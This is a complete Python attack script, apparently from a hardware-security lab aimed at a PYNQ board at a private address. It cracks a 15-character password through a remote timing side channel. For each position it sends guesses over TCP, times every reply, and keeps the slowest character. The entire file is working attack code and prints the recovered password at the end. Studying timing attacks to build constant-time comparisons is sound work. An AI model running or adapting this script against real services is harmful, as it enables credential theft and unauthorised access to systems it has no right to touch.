import socket
import time
import string

TARGET_IP = "192.168.2.99"
TARGET_PORT = 5000

# We know the length is 15 because the server rejects wrong lengths instantly.
# In a real attack, we would brute-force length first.
PASSWORD_LEN = 15 
CHARSET = string.ascii_uppercase + "_"

print(f"--- ATTACK 2: REMOTE TIMING SNIPER ---")
print(f"Target: {TARGET_IP}:{TARGET_PORT}")
print("--------------------------------------")

cracked_password = ""

for position in range(PASSWORD_LEN):
    max_time = 0
    best_char = '?'

    print(f"[Position {position+1}/{PASSWORD_LEN}] Testing: ", end='', flush=True)

    for char in CHARSET:
        # Construct the guess: Known_So_Far + Guess + Padding
        padding = "A" * (PASSWORD_LEN - len(cracked_password) - 1)
        guess = cracked_password + char + padding

        # MEASURE TIME
        start = time.perf_counter()

        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((TARGET_IP, TARGET_PORT))
                s.sendall(guess.encode())
                resp = s.recv(1024)
        except:
            print("\n❌ Connection Failed. Is the PYNQ server running?")
            exit()

        end = time.perf_counter()
        duration = end - start

        # If this character took the longest, it's likely correct
        if duration > max_time:
            max_time = duration
            best_char = char

    cracked_password += best_char
    print(f" Found: '{best_char}' (Delay: {max_time:.4f}s)")

print("--------------------------------------")
print(f"🔥 FINAL PASSWORD: {cracked_password}")
